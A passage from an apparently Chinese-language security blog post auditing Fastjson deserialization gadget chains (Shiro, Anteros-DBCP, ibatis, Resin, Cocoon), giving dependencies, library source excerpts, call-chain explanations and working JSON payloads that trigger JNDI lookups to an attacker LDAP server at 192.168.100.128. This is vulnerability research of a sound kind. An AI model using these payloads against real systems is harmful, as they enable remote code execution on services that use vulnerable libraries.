class="hljs-string">&quot;jndiNames&quot;</span>: [<span class="hljs-string">&quot;ldap://192.168.100.128:1389/Exploit&quot;</span>],<br>    <span class="hljs-string">&quot;Realms&quot;</span>: [<span class="hljs-string">&quot;&quot;</span>]<br>&#125;<br><br></code></pre></td></tr></table></figure><p>看<code>org.apache.shiro.realm.jndi.JndiRealmFactory</code></p><p>在<code>org.apache.shiro.realm.jndi.JndiRealmFactory#getRealms</code>调用了<code>lookup</code>，参数是<code>org.apache.shiro.realm.jndi.JndiRealmFactory#getJndiNames</code>的返回值，并且需要键值为集合类型，因为<code>Collection&lt;String&gt; jndiNames = null;</code>而<code>setter</code>接收的参数是<code>Collection&lt;String&gt;</code>（集合）类型</p><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1746619508940-91fb634c-b987-465e-9ee2-7f0c855ac1ba.png"></p><p>所以是<code>getRealms</code>触发的<code>jndi</code>，payload的<code>Realms</code>字段是必须的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Collection&lt;Realm&gt; <span class="hljs-title function_">getRealms</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IllegalStateException &#123;<br>       Collection&lt;String&gt; jndiNames = <span class="hljs-built_in">this</span>.getJndiNames();<br>       <span class="hljs-keyword">if</span> (jndiNames != <span class="hljs-literal">null</span> &amp;&amp; !jndiNames.isEmpty()) &#123;<br>           List&lt;Realm&gt; realms = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>(jndiNames.size());<br>           <span class="hljs-type">Iterator</span> <span class="hljs-variable">var3</span> <span class="hljs-operator">=</span> jndiNames.iterator();<br><br>           <span class="hljs-keyword">while</span>(var3.hasNext()) &#123;<br>               <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> (String)var3.next();<br><br>               <span class="hljs-keyword">try</span> &#123;<br>                   <span class="hljs-type">Realm</span> <span class="hljs-variable">realm</span> <span class="hljs-operator">=</span> (Realm)<span class="hljs-built_in">this</span>.lookup(name, Realm.class);<br>                   realms.add(realm);<br>               &#125; <span class="hljs-keyword">catch</span> (Exception var6) &#123;<br>                   <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalStateException</span>(<span class="hljs-string">&quot;Unable to look up realm with jndi name &#x27;&quot;</span> + name + <span class="hljs-string">&quot;&#x27;.&quot;</span>, var6);<br>               &#125;<br>           &#125;<br><br>           <span class="hljs-keyword">return</span> realms.isEmpty() ? <span class="hljs-literal">null</span> : realms;<br>       &#125; <span class="hljs-keyword">else</span> &#123;<br>           <span class="hljs-type">String</span> <span class="hljs-variable">msg</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;One or more jndi names must be specified for the &quot;</span> + <span class="hljs-built_in">this</span>.getClass().getName() + <span class="hljs-string">&quot; to locate Realms.&quot;</span>;<br>           <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalStateException</span>(msg);<br>       &#125;<br>   &#125;<br></code></pre></td></tr></table></figure><p>为什么反序列化会调用<code>getRealms</code>，因为<code>getRealms</code>返回类型为<code>Collection&lt;Realm&gt;</code>，并且注意到这里没有<code>setRealms</code>方法，但是传入的键值对中有<code>Realms</code>并且值是集合，所以需要<code>getRealms()</code>获取集合实例然后通过反射或集合方法填充数据，如这里使用<code>realms.add(realm)</code></p><p>所以gadget如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;org.apache.shiro.realm.jndi.JndiRealmFactory&quot;</span> -&gt; setJndiNames -&gt; getRealms.lookup(getRealms)<br></code></pre></td></tr></table></figure><h2 id="AnterosDBCPConfig-Anteros-DBCP依赖"><a href="#AnterosDBCPConfig-Anteros-DBCP依赖" class="headerlink" title="AnterosDBCPConfig  Anteros-DBCP依赖"></a>AnterosDBCPConfig  Anteros-DBCP依赖</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;dependency&gt;<br>    &lt;groupId&gt;br.com.anteros&lt;/groupId&gt;<br>    &lt;artifactId&gt;Anteros-DBCP&lt;/artifactId&gt;<br>    &lt;version&gt;<span class="hljs-number">1.0</span><span class="hljs-number">.1</span>&lt;/version&gt;<br>&lt;/dependency&gt;<br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br>    <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;</span>,<br>    <span class="hljs-string">&quot;metricRegistry&quot;</span>: <span class="hljs-string">&quot;ldap://192.168.100.128:1389/Exploit&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>br.com.anteros.dbcp.AnterosDBCPConfig#setMetricRegistry</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setMetricRegistry</span><span class="hljs-params">(Object metricRegistry)</span> &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.metricsTrackerFactory != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalStateException</span>(<span class="hljs-string">&quot;cannot use setMetricRegistry() and setMetricsTrackerFactory() together&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">if</span> (metricRegistry != <span class="hljs-literal">null</span>) &#123;<br>            metricRegistry = <span class="hljs-built_in">this</span>.getObjectOrPerformJndiLookup(metricRegistry);<br>            <span class="hljs-keyword">if</span> (!UtilityElf.safeIsAssignableFrom(metricRegistry, <span class="hljs-string">&quot;com.codahale.metrics.MetricRegistry&quot;</span>) &amp;&amp; !UtilityElf.safeIsAssignableFrom(metricRegistry, <span class="hljs-string">&quot;io.micrometer.core.instrument.MeterRegistry&quot;</span>)) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;Class must be instance of com.codahale.metrics.MetricRegistry or io.micrometer.core.instrument.MeterRegistry&quot;</span>);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-built_in">this</span>.metricRegistry = metricRegistry;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>调用了<code>getObjectOrPerformJndiLookup</code>参数是<code>metricRegistry</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> Object <span class="hljs-title function_">getObjectOrPerformJndiLookup</span><span class="hljs-params">(Object object)</span> &#123;<br>    <span class="hljs-keyword">if</span> (object <span class="hljs-keyword">instanceof</span> String) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">InitialContext</span> <span class="hljs-variable">initCtx</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>            <span class="hljs-keyword">return</span> initCtx.lookup((String)object);<br>        &#125; <span class="hljs-keyword">catch</span> (NamingException var3) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(var3);<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> object;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><code>return initCtx.lookup((String)object)调用了lookup</code></p><p>gadget</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;</span> -&gt; setMetricRegistry -&gt; getObjectOrPerformJndiLookup.lookup<br></code></pre></td></tr></table></figure><p>另一个payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br>    <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;</span>,<br>    <span class="hljs-string">&quot;healthCheckRegistry&quot;</span>: <span class="hljs-string">&quot;ldap://192.168.100.128:1389/Exploit&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>br.com.anteros.dbcp.AnterosDBCPConfig#setHealthCheckRegistry</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setHealthCheckRegistry</span><span class="hljs-params">(Object healthCheckRegistry)</span> &#123;<br>    <span class="hljs-built_in">this</span>.checkIfSealed();<br>    <span class="hljs-keyword">if</span> (healthCheckRegistry != <span class="hljs-literal">null</span>) &#123;<br>        healthCheckRegistry = <span class="hljs-built_in">this</span>.getObjectOrPerformJndiLookup(healthCheckRegistry);<br>        <span class="hljs-keyword">if</span> (!(healthCheckRegistry <span class="hljs-keyword">instanceof</span> HealthCheckRegistry)) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;Class must be an instance of com.codahale.metrics.health.HealthCheckRegistry&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">this</span>.healthCheckRegistry = healthCheckRegistry;<br>&#125;<br></code></pre></td></tr></table></figure><p>同样调用了<code>getObjectOrPerformJndiLookup</code></p><h2 id="JtaTransactionConfig-ibatis-sqlmap和jta依赖"><a href="#JtaTransactionConfig-ibatis-sqlmap和jta依赖" class="headerlink" title="JtaTransactionConfig ibatis-sqlmap和jta依赖"></a>JtaTransactionConfig ibatis-sqlmap和jta依赖</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;dependency&gt;<br>    &lt;groupId&gt;org.apache.ibatis&lt;/groupId&gt;<br>    &lt;artifactId&gt;ibatis-sqlmap&lt;/artifactId&gt;<br>    &lt;version&gt;<span class="hljs-number">2.3</span><span class="hljs-number">.4</span><span class="hljs-number">.726</span>&lt;/version&gt;<br>&lt;/dependency&gt;<br><br>&lt;dependency&gt;<br>    &lt;groupId&gt;javax.transaction&lt;/groupId&gt;<br>    &lt;artifactId&gt;jta&lt;/artifactId&gt;<br>    &lt;version&gt;<span class="hljs-number">1.1</span>&lt;/version&gt;<br>&lt;/dependency&gt;<br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs perl">&#123;<br>    <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;</span>,<br>    <span class="hljs-string">&quot;properties&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;java.util.Properties&quot;</span>,<br>        <span class="hljs-string">&quot;UserTransaction&quot;</span>: <span class="hljs-string">&quot;ldap://192.168.100.128:1389/Exploit&quot;</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig#setProperties</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setProperties</span><span class="hljs-params">(Properties props)</span> <span class="hljs-keyword">throws</span> SQLException, TransactionException &#123;<br>       <span class="hljs-type">String</span> <span class="hljs-variable">utxName</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>       <span class="hljs-keyword">try</span> &#123;<br>           utxName = (String)props.get(<span class="hljs-string">&quot;UserTransaction&quot;</span>);<br>           <span class="hljs-type">InitialContext</span> <span class="hljs-variable">initCtx</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>           <span class="hljs-built_in">this</span>.userTransaction = (UserTransaction)initCtx.lookup(utxName);<br>       &#125; <span class="hljs-keyword">catch</span> (NamingException var4) &#123;<br>           <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SqlMapException</span>(<span class="hljs-string">&quot;Error initializing JtaTransactionConfig while looking up UserTransaction (&quot;</span> + utxName + <span class="hljs-string">&quot;).  Cause: &quot;</span> + var4);<br>       &#125;<br>   &#125;<br></code></pre></td></tr></table></figure><p>参数是<code>Properties</code>的实例，而<code>java.util.Properties#setProperty</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> Object <span class="hljs-title function_">setProperty</span><span class="hljs-params">(String key, String value)</span> &#123;<br>        <span class="hljs-keyword">return</span> put(key, value);<br>    &#125;<br></code></pre></td></tr></table></figure><p>通过<code>put</code>设置键值对也就是<code>UserTransaction:ldap://192.168.100.128:1389/Exploit</code>所以无需<code>setUserTransaction</code></p><p>然后<code>utxName = (String)props.get(&quot;UserTransaction&quot;);</code>获取键值作为参数调用<code>initCtx.lookup(utxName)</code>jndi注入</p><p>gadget</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;</span> -&gt; setProperties -&gt; setProperty -&gt; setProperties.lookup<br></code></pre></td></tr></table></figure><h2 id="ResourceRef-com-caucho-resin依赖"><a href="#ResourceRef-com-caucho-resin依赖" class="headerlink" title="ResourceRef com.caucho.resin依赖"></a>ResourceRef com.caucho.resin依赖</h2><p>pom</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;dependency&gt;<br>    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;<br>    &lt;artifactId&gt;fastjson&lt;/artifactId&gt;<br>    &lt;version&gt;<span class="hljs-number">1.2</span><span class="hljs-number">.62</span>&lt;/version&gt;<br>&lt;/dependency&gt;<br><br>&lt;dependency&gt;<br>    &lt;groupId&gt;com.caucho&lt;/groupId&gt;<br>    &lt;artifactId&gt;resin&lt;/artifactId&gt;<br>    &lt;version&gt;<span class="hljs-number">4.0</span><span class="hljs-number">.66</span>&lt;/version&gt; <br>&lt;/dependency&gt;<br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br>    <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.caucho.config.types.ResourceRef&quot;</span>,<br>    <span class="hljs-string">&quot;lookupName&quot;</span>: <span class="hljs-string">&quot;ldap://192.168.100.128:1389/Exploit&quot;</span>,<br>    <span class="hljs-string">&quot;value&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;$ref&quot;</span>: <span class="hljs-string">&quot;$.value&quot;</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在<code>D:\maven_repo\com\caucho\resin\4.0.66\resin-4.0.66.jar!\com\caucho\config\types\ResourceRef.class</code>的<code>com.caucho.config.types.ResourceRef#getValue</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getValue</span><span class="hljs-params">()</span> &#123;<br>    Object value;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>._value != <span class="hljs-literal">null</span>) &#123;<br>        value = <span class="hljs-built_in">this</span>._value;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.getLookupName() != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> Jndi.lookup(<span class="hljs-built_in">this</span>.getLookupName());<br>        &#125;<br><br>        <span class="hljs-type">InjectManager</span> <span class="hljs-variable">cdiManager</span> <span class="hljs-operator">=</span> InjectManager.getCurrent();<br>        value = cdiManager.getReference(<span class="hljs-built_in">this</span>._bean);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> value;<br>&#125;<br></code></pre></td></tr></table></figure><p>没有定义变量和<code>setter</code>，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-string">&quot;value&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;$ref&quot;</span>: <span class="hljs-string">&quot;$.value&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>循环引用，访问根节点（当前 JSON 根节点下）也就是<code>ResourceRef</code>的<code>instance</code>属性，Fastjson 会通过反射调用 <code>getValue() </code>方法（如果存在）或直接访问 <code>value</code>字段来获取值（这里没有）</p><p><code> return Jndi.lookup(this.getLookupName());</code>调用<code>lookup</code>参数是<code>this.getLookupName()</code>跟进这个方法发现是父类的getter<code>com.caucho.config.types.ResourceGroupConfig#getLookupName</code></p><p>因为子类没有重写<code>getter</code>和<code>setter</code>所以反序列化时用的是父类<code>ResourceGroupConfig</code>的<code>setter</code>和<code>getter</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setLookupName</span><span class="hljs-params">(String lookupName)</span> &#123;<br>    <span class="hljs-built_in">this</span>._lookupName = lookupName;<br>&#125;<br><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">getLookupName</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>._lookupName;<br>&#125;<br></code></pre></td></tr></table></figure><p>gadget</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.caucho.config.types.ResourceRef&quot;</span> -&gt;   发现 `$ref` -&gt; 解析 `$.value` -&gt; 反射调用 ResourceRef.getValue().lookup(getLookupName)<br></code></pre></td></tr></table></figure><h2 id="org-apache-cocoon-components-slide-impl-JMSContentInterceptor"><a href="#org-apache-cocoon-components-slide-impl-JMSContentInterceptor" class="headerlink" title="org.apache.cocoon.components.slide.impl.JMSContentInterceptor"></a>org.apache.cocoon.components.slide.impl.JMSContentInterceptor</h2><p>pom</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs xml">        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>slide<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>slide-kernel<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>cocoon<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>cocoon-slide<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.1.11<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>//需要javaee环境，非javaee需要引入下面的依赖<br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>javax.jms<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javax.jms-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.0.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>javax.transaction<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javax.transaction-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span> <br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs awk">&#123;<br>    <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;org.apache.cocoon.components.slide.impl.JMSContentInterceptor&quot;</span>,<br>    <span class="hljs-string">&quot;parameters&quot;</span>: &#123;<br>        <span class="hljs-regexp">//</span> <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;java.util.Hashtable&quot;</span>, <span class="hljs-regexp">//</span>可有可无<br>        <span class="hljs-string">&quot;java.naming.factory.initial&quot;</span>: <span class="hljs-string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>,<br>        <span class="hljs-string">&quot;topic-factory&quot;</span>: <span class="hljs-string">&quot;ldap://192.168.100.128:1389/Exploit&quot;</span><br>    &#125;,<br>    <span class="hljs-string">&quot;namespace&quot;</span>: <span class="hljs-string">&quot;&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>在<code>D:\maven_repo\cocoon\cocoon-slide\2.1.11\cocoon-slide-2.1.11.jar!\org\apache\cocoon\components\slide\impl\JMSContentInterceptor.class</code></p><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1747234439937-dbdb7017-52e2-40f2-ad5b-1d71230fd3d5.png"></p><p>可以看到触发<code>lookup</code>的是<code>org.apache.cocoon.components.slide.impl.JMSContentInterceptor#setNamespace</code>参数是<code>this.m_topicFactoryName</code>，所以需要传入<code>&quot;namespace&quot;: &quot;&quot;</code>来触发<code>setter</code></p><p>在调用<code>lookup</code>之前，如果想自定义参数（比如要ldap或者rmi）需要先初始化，<code>InitialContext</code>是访问命名服务的入口点，<code>lookup() </code>方法需要知道从哪里查找资源（如 <code>com.sun.jndi.rmi.registry.RegistryContextFactory</code>） </p><p>这里<code>InitialContext()</code>的参数是<code>this.m_jndiProps</code>和<code>lookup</code>的参数<code>m_topicFactoryName</code>都在<code>org.apache.cocoon.components.slide.impl.JMSContentInterceptor#setParameters</code>通过<code>getParameter</code>来获取</p><p>需要传入一个<code>parameters</code>触发<code>setParameters</code>，并且设置<code>&quot;java.naming.factory.initial&quot;: &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</code>和<code>&quot;topic-factory&quot;: &quot;ldap://192.168.100.128:1389/Exploit&quot;</code></p><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1747235198971-05704c71-45f4-4f0b-9db2-c913ca95f752.png"></p><p>因为初始化时同时传入了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-built_in">this</span>.m_jndiProps.put(<span class="hljs-string">&quot;java.naming.provider.url&quot;</span>, <span class="hljs-string">&quot;rmi://localhost:1099/&quot;</span>); <span class="hljs-comment">// 默认值或传入值</span><br></code></pre></td></tr></table></figure><p>这告诉 JNDI 使用 RMI 注册表作为其初始的命名服务，<code>com.sun.jndi.rmi.registry.RegistryContextFactory</code>是用来与 RMI 注册表交互的工厂，只用于初始化， 以便能够开始 JNDI 操作  </p><p>当<code> lookup()</code> 方法接收到一个以 URL 形式（如 ldap://…, rmi://…, dns://… 等）的字符串参数时，JNDI 的行为会发生变化：</p><ul><li>JNDI 会解析这个 URL，并识别出其协议 (scheme)，在这里是 “ldap”。 </li><li>然后，JNDI 会尝试寻找并加载一个能够处理该特定协议的 URL 上下文工厂 (URL Context Factory)。</li><li>对于 “ldap” 协议，它会寻找 LDAP 服务提供者 (LDAP Service Provider) 中注册的 LDAP URL 上下文工厂。</li><li> 如果找到了合适的 LDAP URL 上下文工厂（Java 运行时通常内置了 LDAP 服务提供者），JNDI 就会使用这个工厂来解析和处理该 LDAP URL。 </li></ul><p>gadget</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">JMSContentInterceptor#setNamespace -&gt; JMSContentInterceptor#setParameters -&gt;  